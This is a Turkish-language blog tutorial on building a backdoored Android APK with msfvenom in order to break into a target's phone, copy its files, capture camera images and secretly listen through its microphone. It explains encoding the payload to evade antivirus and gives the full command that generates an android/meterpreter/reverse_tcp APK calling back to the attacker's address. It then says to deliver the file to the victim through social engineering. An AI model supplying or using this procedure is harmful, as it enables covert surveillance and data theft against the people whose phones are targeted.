---
title: Msfvenom ile Android Telefonlara Sızma
category: blog
last_modified_at: 2017-06-27
---
Merhaba arkadaşlar bu yazımda android bir telefona arka kapı(backdoor) açarak sızacağız ve hedef telefondan dosyaları kendi bilgisayarımıza çekeceğiz, kamera görüntüleri yakalayıp, telefonun mikrofonunu aktif ederek ortam dinleme yapmaya çalışacağız.

Bu sızma testinde işletim sistemi olarak Kali 2017.1 dağıtımını kullanıyorum.

İlk önce kendi IP adresimi öğreniyorum, ilerleyen bölümlerde lazım olacak. Bunun için terminali açıp

![res1](https://www.hubeybi.com/wp-content/uploads/2017/06/and1.png)

    ifconfig

&nbsp;

yazıyorum ve ip adresimi not ediyorum. (wlan0 başlığı altındaki inet yazan bölüm bizim IP adresimiz oluyor.)

Şimdi bash ekranına gelip

    msfvenom -h

&nbsp;

&nbsp;

yazıyorum. Bu bölümden sızmak için gerekli olan .apk dosyasını oluşturacağız. Ekrana şimdi msfvenom aracının options seçenekleri, parametreleri ve bunların ne işe yaradıklarını gösteren bir yardım menüsü gelecek.

Parametrelerin bazılarının açıklamaları aşağıdaki gibidir.

> -p : Payload'u ifade eder. Oluşturduğumuz zararlı dosya açıldıktan sonra çalışacak olan kod parçasıdır.
> -e : Encoder'ı ifade eder. Oluşturduğumuz zararlı dosyayı bu parametreyle antivirüs programlarına yakalanmaması için
> şifreleyeceğiz.
> -i : İterations'ı ifade eder. Oluşturduğumuz zararlı dosyayı kaç defa şifreyeleceğimizi bu parametreyi kullanarak belirleyeceğiz.
> -f : Format'ı ifade eder. Oluşturacağımız zararlı dosyayı hangi formatta kaydeceğimizi bu parametreyle belirleyeceğiz.
> -a : Architecture'u ifade eder. Oluşturulan zararlı dosyanın hangi mimaride(32Bit-64Bit) çalışacağını bu parametreyle belirleyeceğiz.


> LHOST : Bu bölüme yukarıda "ifconfig" komutundan yararlanarak
> aldığımız ve bağlantı kurabilmek için kendi IP adresimizi gireceğiz.
> 
> LPORT : Bu bölüme gelen bağlantıları hangi port üzerinden dinlemek istiyorsak onu gireceğiz.

Şimdi sıra geldi zararlı dosyamızı oluşturmaya. Bash ekranıma aşağıdaki komutu giriyorum.

    msfvenom -p android/meterpreter/reverse_tcp LHOST=ipdaresimburaya LPORT=34 R > Desktop/zararli.apk

&nbsp;

koduyla zararlı dosyamı hazırlamış oldum. Şimdi "Sosyal Müdendislik" kullanarak bunu hedef aygıta yükleyebiliriz.

![and2](https://www.hubeybi.com/wp-content/uploads/2017/06/and2.png)